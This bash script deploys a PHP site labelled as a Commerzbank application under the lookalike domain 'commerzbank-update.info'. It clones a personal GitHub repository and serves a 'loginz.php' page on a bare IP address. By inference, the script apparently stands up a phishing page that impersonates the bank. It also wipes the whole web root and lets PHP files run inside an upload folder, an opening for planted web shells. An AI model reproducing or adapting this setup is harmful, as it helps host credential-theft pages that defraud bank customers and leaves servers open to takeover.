#!/bin/bash

# Fresh Deployment Script for Commerzbank Application
# This script will clean everything and deploy from scratch

set -e  # Exit on any error

echo "🧹 Starting Fresh Deployment Process..."

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    print_error "Please run this script as root (use sudo)"
    exit 1
fi

print_status "Step 1: Stopping services..."
systemctl stop nginx 2>/dev/null || true
systemctl stop php7.2-fpm 2>/dev/null || true
systemctl stop php8.1-fpm 2>/dev/null || true
print_success "Services stopped"

print_status "Step 2: Cleaning existing application files..."
rm -rf /var/www/html/comm
rm -rf /var/www/html/*
print_success "Application files cleaned"

print_status "Step 3: Removing Nginx configurations..."
rm -f /etc/nginx/sites-available/comm
rm -f /etc/nginx/sites-enabled/comm
rm -f /etc/nginx/sites-available/commerzbank-update.info
rm -f /etc/nginx/sites-enabled/commerzbank-update.info
rm -f /etc/nginx/sites-enabled/default
print_success "Nginx configurations removed"

print_status "Step 4: Updating system packages..."
apt update -y
print_success "System updated"

print_status "Step 5: Installing required packages..."
apt install -y nginx php7.2-fpm php7.2-cli php7.2-common php7.2-mysql php7.2-zip php7.2-gd php7.2-mbstring php7.2-curl php7.2-xml php7.2-bcmath git curl
print_success "Packages installed"

print_status "Step 6: Starting PHP-FPM..."
systemctl start php7.2-fpm
systemctl enable php7.2-fpm
print_success "PHP-FPM started"

print_status "Step 7: Cloning application from GitHub..."
cd /var/www/html
git clone https://github.com/kamrankamrankhan/comm.git comm
print_success "Application cloned"

print_status "Step 8: Setting up Nginx configuration..."
cat > /etc/nginx/sites-available/commerzbank-update.info << 'EOF'
server {
    listen 80;
    listen [::]:80;
    server_name _;
    root /var/www/html/comm;
    index index.php index.html index.htm;

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "no-referrer-when-downgrade" always;
    add_header Content-Security-Policy "default-src 'self' http: https: data: blob: 'unsafe-inline'" always;

    # Main location block
    location / {
        try_files $uri $uri/ =404;
    }

    # PHP processing
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
        
        # Security
        fastcgi_hide_header X-Powered-By;
        fastcgi_read_timeout 300;
        fastcgi_connect_timeout 300;
        fastcgi_send_timeout 300;
    }

    # Deny access to hidden files
    location ~ /\. {
        deny all;
    }

    # Deny access to sensitive files
    location ~* \.(ini|log|conf)$ {
        deny all;
    }

    # File upload location (if needed)
    location /views/xentryxupload/ {
        client_max_body_size 50M;
        try_files $uri $uri/ =404;
        
        location ~ \.php$ {
            include snippets/fastcgi-php.conf;
            fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            include fastcgi_params;
        }
    }

    # Logging
    access_log /var/log/nginx/commerzbank_access.log;
    error_log /var/log/nginx/commerzbank_error.log;
}
EOF

print_success "Nginx configuration created"

print_status "Step 9: Enabling site..."
ln -sf /etc/nginx/sites-available/commerzbank-update.info /etc/nginx/sites-enabled/
print_success "Site enabled"

print_status "Step 10: Setting permissions..."
chown -R www-data:www-data /var/www/html/comm
chmod -R 755 /var/www/html/comm
find /var/www/html/comm -type f -name "*.php" -exec chmod 644 {} \;
print_success "Permissions set"

print_status "Step 11: Testing Nginx configuration..."
nginx -t
print_success "Nginx configuration test passed"

print_status "Step 12: Starting Nginx..."
systemctl start nginx
systemctl enable nginx
print_success "Nginx started"

print_status "Step 13: Checking service status..."
systemctl status nginx --no-pager -l
systemctl status php7.2-fpm --no-pager -l

print_success "Fresh deployment completed successfully!"
echo ""
echo "🌐 Your application is now accessible at:"
echo "   http://193.124.205.44"
echo "   http://193.124.205.44/views/loginz.php"
echo ""
echo "📋 Next steps:"
echo "   1. Test the application in your browser"
echo "   2. Check logs if needed: tail -f /var/log/nginx/commerzbank_error.log"
echo "   3. Monitor with: systemctl status nginx"
echo ""
print_success "Deployment complete! 🚀"
